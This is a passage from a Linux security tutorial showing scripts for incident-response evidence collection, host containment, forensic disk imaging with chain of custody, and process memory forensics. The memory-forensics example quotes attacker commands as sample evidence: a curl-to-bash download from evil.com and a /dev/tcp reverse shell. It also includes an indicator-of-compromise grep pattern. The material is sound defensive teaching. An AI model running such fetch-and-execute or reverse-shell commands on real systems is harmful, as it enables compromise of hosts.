echo "=== INCIDENT ${INCIDENT_ID} — $(date -Iseconds) ===" | tee "${IR_DIR}/ir-log.txt"

# --- PHASE 2: IDENTIFICATION — collect volatile evidence (order of volatility) ---
# Collect most volatile data first (RAM > network state > processes > disk)

# 1. Capture current network connections (volatile: changes every second)
ss -tulpn > "${IR_DIR}/network-connections.txt" 2>&1
# => ss: socket statistics; shows all listening and established connections with PIDs
netstat -an >> "${IR_DIR}/network-connections.txt" 2>&1 || true
echo "[COLLECTED] Network connections" | tee -a "${IR_DIR}/ir-log.txt"

# 2. Capture process list with full command lines and parent PIDs
ps auxf > "${IR_DIR}/process-tree.txt"
# => auxf: all processes, user context, full command line, forest (tree) view
# => look for: unusual parent PIDs, processes spawned from web server, base64-encoded commands
echo "[COLLECTED] Process tree" | tee -a "${IR_DIR}/ir-log.txt"

# 3. Capture who is currently logged in (active attacker sessions)
who > "${IR_DIR}/current-users.txt"
last -50 >> "${IR_DIR}/current-users.txt"
w >> "${IR_DIR}/current-users.txt"
# => who: current logged-in users; last: recent logins; w: what each user is doing
echo "[COLLECTED] Current users and login history" | tee -a "${IR_DIR}/ir-log.txt"

# 4. Capture active outbound connections (the alert trigger)
ss -tnp state established > "${IR_DIR}/established-connections.txt"
# => shows all established TCP connections with PIDs — identifies which process is talking out
echo "[COLLECTED] Established connections" | tee -a "${IR_DIR}/ir-log.txt"

# 5. Hash critical system binaries (detect trojanized binaries)
sha256sum /bin/bash /bin/sh /usr/sbin/sshd /usr/bin/sudo \
  > "${IR_DIR}/binary-hashes.txt" 2>&1
# => compare against known-good hashes from a clean baseline or package manager
dpkg -V openssh-server sudo bash 2>&1 \
  >> "${IR_DIR}/binary-hashes.txt"
# => dpkg -V: verifies installed package files against their checksums
# => non-empty output means a file has been modified after installation
echo "[COLLECTED] Binary integrity check" | tee -a "${IR_DIR}/ir-log.txt"

# 6. Copy recent authentication logs
cp /var/log/auth.log "${IR_DIR}/auth.log"
cp /var/log/syslog "${IR_DIR}/syslog"
journalctl --since "2 hours ago" --no-pager > "${IR_DIR}/journal-2h.txt"
echo "[COLLECTED] System logs" | tee -a "${IR_DIR}/ir-log.txt"

# --- PHASE 3: CONTAINMENT — isolate the host ---

# Block all outbound connections except to IR team's management IP
MANAGEMENT_IP="10.x.99.10"
iptables -I OUTPUT 1 -d "${MANAGEMENT_IP}" -j ACCEPT
# => allow IR team access first before blocking everything else
iptables -I OUTPUT 2 -j DROP
# => drop all other outbound; stops active exfiltration or C2 communication

echo "[CONTAINED] Outbound traffic blocked except to ${MANAGEMENT_IP}" \
  | tee -a "${IR_DIR}/ir-log.txt"

# Preserve the iptables state as evidence
iptables-save > "${IR_DIR}/iptables-pre-containment.txt"
echo "[EVIDENCE] iptables rules saved" | tee -a "${IR_DIR}/ir-log.txt"

echo "=== Collection complete. Evidence in ${IR_DIR} ===" | tee -a "${IR_DIR}/ir-log.txt"
```

**Key Takeaway:** Evidence collection must follow the order of volatility — network connections
and running processes disappear when the system is rebooted or processes exit, so capture them
before taking any containment action that might alter system state.

**Why It Matters:** Incident response quality determines whether an organization can answer the
three key post-incident questions: What did the attacker access? How did they get in? How long
were they present? Automated IR scripts ensure evidence is collected consistently under time
pressure, when on-call engineers are stressed and prone to missing steps. Containment that
preserves forensic state — blocking outbound rather than shutting down — gives investigators
a live system to analyze rather than relying on post-mortem disk images alone.

---

## Example 56: Evidence Collection and Chain of Custody

**What this covers:** Forensic evidence collection requires creating bit-exact disk images with
verified checksums and documenting the chain of custody to ensure evidence is admissible in legal
proceedings. This example uses dd and sha256sum to image a disk and establish chain of custody
documentation.

**Scenario:** A Ubuntu 22.04 forensic workstation images a suspect disk (/dev/sdb, 100GB)
attached via write-blocker. The image must be legally defensible.

```bash
#!/usr/bin/env bash
# forensic-image.sh — bit-exact disk imaging with chain of custody
set -euo pipefail

SUSPECT_DISK="/dev/sdb"              # => suspect disk (confirmed via lsblk BEFORE this script)
EVIDENCE_DIR="/mnt/evidence-storage" # => write-once NFS or external drive (write-blocker)
CASE_ID="CASE-2026-0521"
EXAMINER="alice@security.example.com"
IMAGE_FILE="${EVIDENCE_DIR}/${CASE_ID}-sdb.img"
HASH_FILE="${EVIDENCE_DIR}/${CASE_ID}-sdb.sha256"
COC_FILE="${EVIDENCE_DIR}/${CASE_ID}-chain-of-custody.txt"

# --- Pre-imaging verification: confirm disk is write-protected ---
# If using a hardware write-blocker, the disk must be read-only at this point
blockdev --getro "${SUSPECT_DISK}"
# => 1 = read-only (write-blocker working correctly)
# => 0 = writable — STOP; attach write-blocker before proceeding
# => writing to the suspect disk contaminates evidence (alters timestamps, modifies data)

# Record suspect disk metadata before imaging
DISK_MODEL=$(hdparm -I "${SUSPECT_DISK}" 2>/dev/null | grep "Model Number" | awk -F: '{print $2}' | xargs)
DISK_SIZE=$(blockdev --getsize64 "${SUSPECT_DISK}")
DISK_SERIAL=$(hdparm -I "${SUSPECT_DISK}" 2>/dev/null | grep "Serial Number" | awk -F: '{print $2}' | xargs)

# --- Create the forensic disk image ---
echo "Starting imaging at $(date -Iseconds)" | tee -a "${COC_FILE}"

# dd: bit-exact copy including unallocated space, slack space, and deleted files
dd \
  if="${SUSPECT_DISK}" \             # => input: suspect disk (read-only)
  of="${IMAGE_FILE}" \               # => output: evidence image file
  bs=512 \                           # => block size: 512 bytes (one sector)
  conv=noerror,sync \                # => noerror: continue on read errors; sync: pad bad blocks with zeros
  status=progress \                  # => show progress: bytes copied, speed, ETA
  2>&1 | tee -a "${COC_FILE}"
# => conv=noerror,sync is critical: without it, dd aborts on bad sectors and produces a truncated image
# => sync pads unreadable sectors with zeros, preserving correct offset alignment

echo "Imaging complete at $(date -Iseconds)" | tee -a "${COC_FILE}"

# --- Compute hashes of BOTH source and image (must match for admissibility) ---

# Hash the suspect disk (hash of original)
echo "Computing SHA-256 of original disk..." | tee -a "${COC_FILE}"
sha256sum "${SUSPECT_DISK}" | tee "${HASH_FILE}"
# => reads entire disk again; stores hash in HASH_FILE
# => format: <64-char-hex>  /dev/sdb

# Hash the image file (must match disk hash)
echo "Computing SHA-256 of image file..." | tee -a "${COC_FILE}"
sha256sum "${IMAGE_FILE}" | tee -a "${HASH_FILE}"
# => if sha256sum of /dev/sdb == sha256sum of image.img, image is verified bit-exact

# Verify the two hashes match
DISK_HASH=$(grep "${SUSPECT_DISK}" "${HASH_FILE}" | awk '{print $1}')
IMG_HASH=$(grep "${IMAGE_FILE}" "${HASH_FILE}" | awk '{print $1}')

if [[ "${DISK_HASH}" == "${IMG_HASH}" ]]; then
    echo "VERIFIED: Hashes match — image is forensically sound" | tee -a "${COC_FILE}"
else
    echo "ERROR: Hash mismatch — image is NOT forensically sound. DO NOT USE." | tee -a "${COC_FILE}"
    exit 1
fi

# --- Write chain of custody record ---
cat >> "${COC_FILE}" << EOF
=== CHAIN OF CUSTODY RECORD ===
Case ID:           ${CASE_ID}
Examiner:          ${EXAMINER}
Date/Time:         $(date -Iseconds)
Suspect Disk:      ${SUSPECT_DISK}
Disk Model:        ${DISK_MODEL}
Disk Serial:       ${DISK_SERIAL}
Disk Size (bytes): ${DISK_SIZE}
Image File:        ${IMAGE_FILE}
Disk SHA-256:      ${DISK_HASH}
Image SHA-256:     ${IMG_HASH}
Verification:      PASS
Tool:              dd version $(dd --version 2>&1 | head -1)
Write Blocker:     Hardware (Tableau TX1)
Notes:             Original disk returned to physical evidence locker after imaging.
EOF
# => COC document establishes: who collected, what tool, when, integrity verification
# => signed and stored with image; produced in legal proceedings to prove evidence integrity
```

**Key Takeaway:** The chain of custody is only defensible if the hash of the original disk
matches the hash of the image — always hash both source and destination, never just the image.

**Why It Matters:** Digital forensic evidence without documented chain of custody and hash
verification is inadmissible in most jurisdictions and challenged by defense attorneys in
every case. The dd `conv=noerror,sync` flags are non-negotiable for forensic imaging: aborting
on bad sectors truncates the image and alters offsets, making file carving unreliable. Storing
images on write-once or hardware-locked media protects against accusations of evidence tampering
after collection.

---

## Example 57: Linux Memory Forensics Basics

**What this covers:** Memory forensics extracts evidence from a running process's virtual memory
without attaching a debugger that would alter process state. This example uses /proc/PID/maps
to map a process's memory layout and strings to find plaintext artifacts in the memory dump.

**Scenario:** A suspicious process (PID 4823) is running on a Ubuntu 22.04 server. A forensic
analyst examines its memory layout and extracts readable strings to identify what it is doing
without terminating the process.

```bash
#!/usr/bin/env bash
# memory-forensics.sh — non-invasive process memory examination
# Run as root; non-root cannot access /proc/<pid>/mem for other users' processes

SUSPECT_PID=4823
EVIDENCE_DIR="/secure-storage/incidents/INC-2026-0521"
mkdir -p "${EVIDENCE_DIR}"

# --- Step 1: Capture process metadata ---
ps -p "${SUSPECT_PID}" -o pid,ppid,user,comm,args --no-headers \
  > "${EVIDENCE_DIR}/pid-${SUSPECT_PID}-metadata.txt"
# => PID   PPID  USER    COMM    ARGS
# => 4823  1     www-data bash   bash -c curl http://evil.com/shell.sh | bash
# => suspicious: www-data (web server user) spawning bash with curl pipe — classic webshell pattern

# Record when the process started and its open file descriptors
stat /proc/"${SUSPECT_PID}" >> "${EVIDENCE_DIR}/pid-${SUSPECT_PID}-metadata.txt"
ls -la /proc/"${SUSPECT_PID}"/fd/ >> "${EVIDENCE_DIR}/pid-${SUSPECT_PID}-fd-list.txt" 2>&1
# => fd list shows: open files, network sockets, pipes
# => socket: [123456] entries indicate open network connections

# --- Step 2: Examine the process memory map ---
cat /proc/"${SUSPECT_PID}"/maps > "${EVIDENCE_DIR}/pid-${SUSPECT_PID}-maps.txt"
# => /proc/PID/maps: virtual memory layout of the process
head -30 "${EVIDENCE_DIR}/pid-${SUSPECT_PID}-maps.txt"
# => Sample output:
# 55a1b2c3d000-55a1b2c3e000 r--p 00000000 08:01 1234567 /usr/bin/bash
# => [start_addr]-[end_addr] [perms] [offset] [dev] [inode] [path]
# => perms: r=read, w=write, x=execute, p=private, s=shared
# 55a1b2c3e000-55a1b2c3f000 r-xp 00001000 08:01 1234567 /usr/bin/bash
# => r-xp: readable and executable (code segment)
# 7f8a9b0c1000-7f8a9b0c2000 rwxp 00000000 00:00 0       [heap]
# => rwxp on heap with no file path: allocated memory — could contain injected shellcode
# => rwx (read+write+execute) on anonymous mapping is a common shellcode injection indicator

# Identify suspicious anonymous RWX memory regions
grep " rwxp " "${EVIDENCE_DIR}/pid-${SUSPECT_PID}-maps.txt" \
  | grep -v "\[stack\]\|\[heap\]"
# => anonymous rwxp regions not part of stack or heap are suspicious
# => legitimate programs rarely have rwxp anonymous mappings

# --- Step 3: Dump readable memory regions and extract strings ---
# Extract string artifacts from each readable memory region
while IFS= read -r line; do
    START=$(echo "$line" | awk -F'[-[:space:]]' '{print $1}')
    END=$(echo "$line"   | awk -F'[-[:space:]]' '{print $2}')
    PERMS=$(echo "$line" | awk '{print $2}')

    # Skip regions without read permission
    [[ "${PERMS:0:1}" != "r" ]] && continue

    # Calculate region size in bytes
    SIZE=$(( 16#${END} - 16#${START} ))
    # => hexadecimal arithmetic: 0x7f8a... addresses converted to decimal for dd

    # Dump this memory region to a file
    dd if=/proc/"${SUSPECT_PID}"/mem \
       of="${EVIDENCE_DIR}/pid-${SUSPECT_PID}-region-${START}.bin" \
       bs=1 skip=$(( 16#${START} )) count="${SIZE}" 2>/dev/null || true
    # => /proc/PID/mem: raw virtual memory of the process (requires root)
    # => skip: byte offset = start address converted from hex
    # => conv=noerror not needed for /proc/mem reads; unreadable pages return EIO and are skipped

done < "${EVIDENCE_DIR}/pid-${SUSPECT_PID}-maps.txt"

# --- Step 4: Extract printable strings from all dumped regions ---
strings -n 8 "${EVIDENCE_DIR}"/pid-"${SUSPECT_PID}"-region-*.bin 2>/dev/null \
  | sort -u \
  > "${EVIDENCE_DIR}/pid-${SUSPECT_PID}-strings.txt"
# => strings -n 8: extract sequences of 8+ printable ASCII characters
# => common findings: URLs, IP addresses, command strings, crypto keys, passwords

# Search for indicators of compromise in the extracted strings
grep -Ei "http://|https://|/bin/sh|/bin/bash|chmod|wget|curl|base64" \
  "${EVIDENCE_DIR}/pid-${SUSPECT_PID}-strings.txt" \
  | head -20
# => http://evil.com/shell.sh        — C2 URL found in memory
# => /bin/bash -i >& /dev/tcp/...    — reverse shell command found in heap
# => these strings confirm malicious activity; sufficient to trigger escalation

# Also check for loaded shared libraries not in the maps file (LOLBin abuse)
grep "\.so" "${EVIDENCE_DIR}/pid-${SUSPECT_PID}-maps.txt" \
  | awk '{print $NF}' | sort -u \
  > "${EVIDENCE_DIR}/pid-${SUSPECT_PID}-loaded-libs.txt"
# => verify each library path is legitimate; attacker may inject a malicious .so
# => /tmp/libevil.so in this list = LD_PRELOAD injection for rootkit-style hiding
```

**Key Takeaway:** The combination of `/proc/PID/maps` for memory layout and
`/proc/PID/mem` for raw memory access gives analysts a complete, non-invasive view of a
running process's state — including evidence that would be destroyed by killing the process.

**Why It Matters:** Modern malware executes entirely from memory, leaving no files on disk for
antivirus to detect. Memory forensics is the only technique that recovers evidence of
fileless attacks, injected shellcode, and credentials cached by running processes. The
`/proc` filesystem provides this capability on Linux without requiring a dedicated kernel
module or agent, making it immediately available on any standard Ubuntu server. Evidence
collected from `/proc` must be preserved before the suspect process is killed or the host
rebooted, after which the volatile memory evidence is permanently lost.

---
